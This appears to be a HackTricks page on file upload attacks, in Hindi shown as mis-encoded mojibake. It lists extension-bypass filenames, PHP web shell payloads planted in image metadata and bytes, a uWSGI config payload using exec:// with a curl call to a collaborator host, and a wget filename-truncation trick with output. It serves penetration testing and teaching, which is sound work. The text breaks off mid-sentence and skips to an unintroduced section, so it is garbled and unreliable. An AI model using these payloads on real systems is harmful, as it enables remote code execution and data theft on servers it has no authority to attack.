# рдлрд╛рдЗрд▓ рдЕрдкрд▓реЛрдб

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) **рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ**.
* **рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ PRs рдЬрдорд╛ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ.

</details>

![](<../../.gitbook/assets/image (638) (3).png>)

**Bug bounty tip**: **Intigriti** рдХреЗ рд▓рд┐рдП **рд╕рд╛рдЗрди рдЕрдк** рдХрд░реЗрдВ, рдПрдХ рдкреНрд░реАрдорд┐рдпрдо **bug bounty platform рдЬреЛ рд╣реИрдХрд░реНрд╕ рджреНрд╡рд╛рд░рд╛ рд╣реИрдХрд░реНрд╕ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ**! рд╣рдорд╕реЗ рдЖрдЬ рд╣реА [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) рдкрд░ рдЬреБрдбрд╝реЗрдВ, рдФрд░ **$100,000** рддрдХ рдХреЗ рдмрд╛рдЙрдВрдЯреАрдЬ рдХрдорд╛рдирд╛ рд╢реБрд░реВ рдХрд░реЗрдВ!

{% embed url="https://go.intigriti.com/hacktricks" %}

## рдлрд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рд╕рд╛рдорд╛рдиреНрдп рдкрджреНрдзрддрд┐

рдЕрдиреНрдп рдЙрдкрдпреЛрдЧреА рдПрдХреНрд╕рдЯреЗрдВрд╢рди:

* **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
* **PHPv8 рдореЗрдВ рдХрд╛рдо рдХрд░рдирд╛**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
* **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
* **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
* **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
* **Flash**: _.swf_
* **Perl**: _.pl, .cgi_
* **Erlang Yaws Web Server**: _.yaws_

### рдлрд╛рдЗрд▓ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдЪреЗрдХреНрд╕ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдирд╛

1. рдпрджрд┐ рд▓рд╛рдЧреВ рд╣реЛ, рддреЛ **рдкрд┐рдЫрд▓реЗ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ**. рдЗрдиреНрд╣реЗрдВ рдХреБрдЫ **рдЕрдкрд░рдХреЗрд╕ рдЕрдХреНрд╖рд░реЛрдВ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рднреА рдкрд░реАрдХреНрд╖рдг рдХрд░реЗрдВ: _pHp, .pHP5, .PhAr ..._
2. _**рд╡реИрдз рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЛ рдирд┐рд╖реНрдкрд╛рджрди рдПрдХреНрд╕рдЯреЗрдВрд╢рди рд╕реЗ рдкрд╣рд▓реЗ рдЬреЛрдбрд╝рдиреЗ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ** (рдкрд┐рдЫрд▓реЗ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХрд╛ рднреА рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ):_
* _file.png.php_
* _file.png.Php5_
3. **рдЕрдВрдд рдореЗрдВ рд╡рд┐рд╢реЗрд╖ рд╡рд░реНрдг рдЬреЛрдбрд╝рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ.** рдЖрдк Burp рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рднреА **ascii** рдФрд░ **Unicode** рд╡рд░реНрдгреЛрдВ рдХреЛ **bruteforce** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ. (_рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЖрдк **рдкрд╣рд▓реЗ** рдЙрд▓реНрд▓рд┐рдЦрд┐рдд **рдПрдХреНрд╕рдЯреЗрдВрд╢рди** рдХрд╛ рднреА рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ_)
* _file.php%20_
* _file.php%0a_
* _file.php%00_
* _file.php%0d%0a_
* _file.php/_
* _file.php.\\_
* _file._
* _file.php...._
* _file.pHp5...._
4. рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдХреЗ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдкрд╛рд░реНрд╕рд░ рдХреЛ **рдЪрдХрдорд╛ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЛ рджреЛрдЧреБрдирд╛ рдХрд░рдиреЗ** рдпрд╛ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рдмреАрдЪ **рдЕрдирд╛рд╡рд╢реНрдпрдХ** рдбреЗрдЯрд╛ (null bytes) **рдЬреЛрдбрд╝рдиреЗ** рдХреА рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ. _рдЖрдк **рдкрд┐рдЫрд▓реЗ рдПрдХреНрд╕рдЯреЗрдВрд╢рди** рдХрд╛ рднреА рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмреЗрд╣рддрд░ рдкреЗрд▓реЛрдб рддреИрдпрд╛рд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ._
* _file.png.php_
* _file.png.pHp5_
* _file.php#.png_
* _file.php%00.png_
* _file.php\x00.png_
* _file.php%0a.png_
* _file.php%0d%0a.png_
* _file.phpJunk123png_
5. рдкрд┐рдЫрд▓реА рдЬрд╛рдВрдЪ рдореЗрдВ **рдПрдХ рдФрд░ рдкрд░рдд рдХреЗ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдЬреЛрдбрд╝реЗрдВ**:
* _file.png.jpg.php_
* _file.php%00.png%00.jpg_
6. **рд╡реИрдз рдПрдХреНрд╕рдЯреЗрдВрд╢рди рд╕реЗ рдкрд╣рд▓реЗ рдирд┐рд╖реНрдкрд╛рджрди рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдбрд╛рд▓рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ** рдФрд░ рдкреНрд░рд╛рд░реНрдердирд╛ рдХрд░реЗрдВ рдХрд┐ рд╕рд░реНрд╡рд░ рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рд╣реЛ. (Apache рдорд┐рд╕рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рдЬрд╣рд╛рдВ рдХрд┐рд╕реА рднреА рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рд╕рд╛рде _**.php**_**, рд▓реЗрдХрд┐рди** рдЬрд░реВрд░реА рдирд╣реАрдВ рдХрд┐ .php\*\* рд╕реЗ рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рдкрд░ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧрд╛):
* _рдЙрджрд╛рд╣рд░рдг: file.php.png_
7. **Windows** рдореЗрдВ **NTFS alternate data stream (ADS)** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛. рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рдПрдХ рдирд┐рд╖рд┐рджреНрдз рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рдмрд╛рдж рдФрд░ рдПрдХ рдЕрдиреБрдордд рдПрдХреНрд╕рдЯреЗрдВрд╢рди рд╕реЗ рдкрд╣рд▓реЗ рдПрдХ рдХреЛрд▓рди рд╡рд░реНрдг тАЬ:тАЭ рдбрд╛рд▓рд╛ рдЬрд╛рдПрдЧрд╛. рдирддреАрдЬрддрди, рд╕рд░реНрд╡рд░ рдкрд░ рдПрдХ **рдЦрд╛рд▓реА рдлрд╛рдЗрд▓ рдирд┐рд╖рд┐рджреНрдз рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рд╕рд╛рде** рдмрдирд╛рдИ рдЬрд╛рдПрдЧреА (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП тАЬfile.asax:.jpgтАЭ). рдЗрд╕ рдлрд╛рдЗрд▓ рдХреЛ рдмрд╛рдж рдореЗрдВ рдЕрдиреНрдп рддрдХрдиреАрдХреЛрдВ рдЬреИрд╕реЗ рдХрд┐ рдЗрд╕рдХреЗ рдЫреЛрдЯреЗ рдлрд╛рдЗрд▓рдирд╛рдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рдВрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ. тАЬ**::$data**тАЭ рдкреИрдЯрд░реНрди рдХрд╛ рдЙрдкрдпреЛрдЧ рднреА рдЧреИрд░-рдЦрд╛рд▓реА рдлрд╛рдЗрд▓реЗрдВ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ. рдЗрд╕рд▓рд┐рдП, рдЗрд╕ рдкреИрдЯрд░реНрди рдХреЗ рдмрд╛рдж рдПрдХ рдбреЙрдЯ рд╡рд░реНрдг рдЬреЛрдбрд╝рдирд╛ рднреА рдЖрдЧреЗ рдХреА рдкрд╛рдмрдВрджрд┐рдпреЛрдВ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ (.рдЙрджрд╛. тАЬfile.asp::$data.тАЭ)
8.  рдлрд╛рдЗрд▓рдирд╛рдо рд╕реАрдорд╛рдУрдВ рдХреЛ рддреЛрдбрд╝рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ. рд╡реИрдз рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХрдЯ рдЬрд╛рддрд╛ рд╣реИ. рдФрд░ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг PHP рдмрдЪ рдЬрд╛рддрд╛ рд╣реИ. AAA<--SNIP-->AAA.php

```
# Linux рдЕрдзрд┐рдХрддрдо 255 рдмрд╛рдЗрдЯреНрд╕
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# рдлрд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ рдФрд░ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХрд┐рддрдиреЗ рд╡рд░реНрдгреЛрдВ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ. рдорд╛рди рд▓реЗрдВ рдХрд┐ 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# рдкреЗрд▓реЛрдб рдмрдирд╛рдПрдВ
AAA<--SNIP 232 A-->AAA.php.png
```

### Content-Type, Magic Number, Compression & Resizing рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдирд╛

* **Content-Type** рдЪреЗрдХреНрд╕ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **Content-Type** **рд╣реЗрдбрд░** рдХреА **рдорд╛рди** рдХреЛ рд╕реЗрдЯ рдХрд░реЗрдВ: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **рд╡рд░реНрдбрд▓рд┐рд╕реНрдЯ**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
* **рдореИрдЬрд┐рдХ рдирдВрдмрд░** рдЪреЗрдХ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдлрд╛рдЗрд▓ рдХреА рд╢реБрд░реБрдЖрдд рдореЗрдВ **рдПрдХ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдЗрдореЗрдЬ рдХреЗ рдмрд╛рдЗрдЯреНрд╕ рдЬреЛрдбрд╝реЗрдВ** (рдлрд╛рдЗрд▓ рдХрдорд╛рдВрдб рдХреЛ рднреНрд░рдорд┐рдд рдХрд░реЗрдВ). рдпрд╛ рд╢реЗрд▓ рдХреЛ **рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдХреЗ рдЕрдВрджрд░ рдкреЗрд╢ рдХрд░реЗрдВ**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` рдпрд╛ рдЖрдк рд╕реАрдзреЗ рдПрдХ рдЗрдореЗрдЬ рдореЗрдВ **рдкреЗрд▓реЛрдб рдкреЗрд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
* рдпрджрд┐ рдЖрдкрдХреА рдЗрдореЗрдЬ рдореЗрдВ **рдХрдВрдкреНрд░реЗрд╢рди рдЬреЛрдбрд╝рд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ**, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдХреБрдЫ рдорд╛рдирдХ PHP рд▓рд╛рдЗрдмреНрд░реЗрд░реАрдЬ рдЬреИрд╕реЗ [PHP-GD](https://www.php.net/manual/fr/book.image.php) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдкрд┐рдЫрд▓реА рддрдХрдиреАрдХреЗрдВ рдЙрдкрдпреЛрдЧреА рдирд╣реАрдВ рд╣реЛрдВрдЧреА. рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдк **PLTE chunk** [**рддрдХрдиреАрдХ рдпрд╣рд╛рдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХреА рдЧрдИ рд╣реИ**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреБрдЫ рдкрд╛рда рдбрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ **рдХрдВрдкреНрд░реЗрд╢рди рдХреЛ рдмрдЪрд╛ рд▓реЗрдЧрд╛**.
* [**рдХреЛрдб рдХреЗ рд╕рд╛рде Github**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_plte\_png.php)
* рд╡реЗрдм рдкреЗрдЬ рднреА рдЗрдореЗрдЬ рдХреЛ **рд░реАрд╕рд╛рдЗрдЬрд┐рдВрдЧ** рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП PHP-GD рдлрдВрдХреНрд╢рди `
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
рдЬрдм **configuration** рдлрд╝рд╛рдЗрд▓ **parsed** рдХреА рдЬрд╛рдПрдЧреА, **payload** **executed** рд╣реЛрдЧрд╛ред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ config рдХреЛ parsed рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, **process рдХреЛ рдкреБрдирдГ рдЖрд░рдВрдн рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ** (crash? DoS?) рдпрд╛ рдлрд╝рд╛рдЗрд▓ рдХреЛ **autoreloaded** рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП (рдПрдХ рд╡рд┐рдХрд▓реНрдк рдЬреЛ рдЗрд╕реНрддреЗрдорд╛рд▓ рдореЗрдВ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рд╕реЗрдХрдВрдбреНрд╕ рдХреЛ рдЗрдВрдЧрд┐рдд рдХрд░рддрд╛ рд╣реИ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдкреБрдирдГ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдЧрд░ рдПрдХ рдкрд░рд┐рд╡рд░реНрддрди рдкрд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ)ред

**рдорд╣рддреНрд╡рдкреВрд░реНрдг рдиреЛрдЯ:** uWSGI рдХрд╛ configuration рдлрд╝рд╛рдЗрд▓ рдХрд╛ parsing рдвреАрд▓рд╛ рд╣реИред рдкрд┐рдЫрд▓рд╛ payload рдПрдХ рдмрд╛рдЗрдирд░реА рдлрд╝рд╛рдЗрд▓ рдХреЗ рдЕрдВрджрд░ рдПрдореНрдмреЗрдб рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЗрдореЗрдЬ, pdf, ...).

## **wget File Upload/SSRF Trick**

рдХреБрдЫ рдореМрдХреЛрдВ рдкрд░ рдЖрдк рдкрд╛рдПрдВрдЧреЗ рдХрд┐ рдПрдХ рд╕рд░реНрд╡рд░ **`wget`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ **download** рдХрд░ рд░рд╣рд╛ рд╣реИ рдФрд░ рдЖрдк **URL** рдХреЛ **indicate** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрди рдорд╛рдорд▓реЛрдВ рдореЗрдВ, рдХреЛрдб рдпрд╣ рдЬрд╛рдВрдЪ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдбрд╛рдЙрдирд▓реЛрдб рдХреА рдЧрдИ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХрд╛ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдПрдХ whitelist рдХреЗ рдЕрдВрджрд░ рд╣реИ рддрд╛рдХрд┐ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдХрд┐ рдХреЗрд╡рд▓ рдЕрдиреБрдорддрд┐ рд╡рд╛рд▓реА рдлрд╝рд╛рдЗрд▓реЗрдВ рд╣реА рдбрд╛рдЙрдирд▓реЛрдб рдХреА рдЬрд╛рдПрдВрдЧреАред рд╣рд╛рд▓рд╛рдВрдХрд┐, **рдЗрд╕ рдЬрд╛рдВрдЪ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред**\
**linux** рдореЗрдВ рдПрдХ **filename** рдХреА **рдЕрдзрд┐рдХрддрдо** рд▓рдВрдмрд╛рдИ **255** рд╣реИ, рд╣рд╛рд▓рд╛рдВрдХрд┐, **wget** рдлрд╝рд╛рдЗрд▓рдирд╛рдореЛрдВ рдХреЛ **236** рдЕрдХреНрд╖рд░реЛрдВ рддрдХ рдХрд╛рдЯ рджреЗрддрд╛ рд╣реИред рдЖрдк **"A"\*232+".php"+".gif"** рдирд╛рдордХ рдПрдХ рдлрд╝рд╛рдЗрд▓ **download** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдпрд╣ рдлрд╝рд╛рдЗрд▓рдирд╛рдо **check** рдХреЛ **bypass** рдХрд░реЗрдЧрд╛ (рдЬреИрд╕рд╛ рдХрд┐ рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ **".gif"** рдПрдХ **valid** рдПрдХреНрд╕рдЯреЗрдВрд╢рди рд╣реИ) рд▓реЗрдХрд┐рди `wget` рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдирд╛рдо рдмрджрд▓рдХрд░ **"A"\*232+".php"** рдХрд░ рджреЗрдЧрд╛ред
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: тАШAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.phpтАЩ

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - тАШAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.phpтАЩ saved [10/10]
```
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдПрдХ рдФрд░ рд╡рд┐рдХрд▓реНрдк** рдЬрд┐рд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЖрдк рд╕реЛрдЪ рд░рд╣реЗ рд╣реЛрдВрдЧреЗ рдЗрд╕ рдЬрд╛рдВрдЪ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдпрд╣ рд╣реИ рдХрд┐ **HTTP рд╕рд░реНрд╡рд░ рдХреЛ рдПрдХ рдЕрд▓рдЧ рдлрд╛рдЗрд▓ рдкрд░ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд░рдирд╛**, рддрд╛рдХрд┐ рдкреНрд░рд╛рд░рдВрднрд┐рдХ URL рдЬрд╛рдВрдЪ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░ рджреЗрдЧрд╛ рд▓реЗрдХрд┐рди рдлрд┐рд░ wget рдирдП рдирд╛рдо рдХреЗ рд╕рд╛рде рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯреЗрдб рдлрд╛рдЗрд▓ рдХреЛ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдЧрд╛ред рдпрд╣ **рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛** **рдЬрдм рддрдХ** wget рдХрд╛ рдЙрдкрдпреЛрдЧ **рдкреИрд░рд╛рдореАрдЯрд░** `--trust-server-names` рдХреЗ рд╕рд╛рде рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реЛ рдХреНрдпреЛрдВрдХрд┐ **wget рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯреЗрдб рдкреЗрдЬ рдХреЛ рдореВрд▓ URL рдореЗрдВ рджрд┐рдЦрд╛рдП рдЧрдП рдлрд╛рдЗрд▓ рдХреЗ рдирд╛рдо рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдЧрд╛**ред

#### рдЕрдиреНрдп рд╕рдВрд╕рд╛рдзрди

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
* [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
* [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
* [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)

## рдЙрдкрдХрд░рдг

